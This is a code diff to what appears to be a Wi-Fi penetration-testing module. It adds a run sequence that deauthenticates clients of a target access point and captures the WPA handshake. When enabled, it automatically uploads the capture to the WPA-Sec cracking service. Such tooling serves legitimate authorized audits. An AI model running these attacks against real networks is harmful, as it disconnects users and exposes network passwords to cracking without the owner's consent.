@@ -113,12 +113,40 @@ def run(job) -> None:
         return
 
     try:
-        # Perform deauth
+        # Phase 3: Active External Audit
+        
+        # 1. Deauth Attack (if authorized/configured)
+        # Using aireplay-ng to disconnect clients and force re-association (handshake capture)
         deauth_attack(mon_interface, target_bssid, count=10)
-        # Capture handshake
+        
+        # 2. Handshake Capture (EAPOL)
+        # Using airodump-ng to capture the 4-way handshake
         capture_handshake(mon_interface, target_bssid, target_channel, duration=30, job_id=job.id)
+        
+        # 3. PMKID Capture (Optional/Advanced)
+        # Could use hcxdumptool here if available, but sticking to airodump for now as base tool
+        
+        # 4. Check for captured handshake
+        suffix = f"_job_{job.id}"
+        cap_file = Path(f"capture_{target_bssid.replace(':', '')}{suffix}-01.cap")
+        
+        if cap_file.exists():
+            # Move to data/captures
+            captures_dir = BASE_DIR / "data" / "captures"
+            captures_dir.mkdir(parents=True, exist_ok=True)
+            new_path = captures_dir / cap_file.name
+            cap_file.rename(new_path)
+            logger.info("Handshake capture saved to %s", new_path)
+            
+            # Phase 5: Cracking / Post-Exploitation (Integration)
+            # Automatically upload to WPA-Sec if configured
+            if config.get("hash_services", {}).get("wpa_sec", {}).get("enabled", False):
+                from modules.audits.hash_lookup import upload_to_wpasec
+                upload_to_wpasec(new_path)
+        
         logger.info("Wi-Fi active ops completed for job %s", job.id)
     except Exception as e:
         logger.error("Error in Wi-Fi active ops for job %s: %s", job.id, e)
     finally:
         disable_monitor_mode(mon_interface)
+REQUIRED_PROFILE = "wifi_audit"
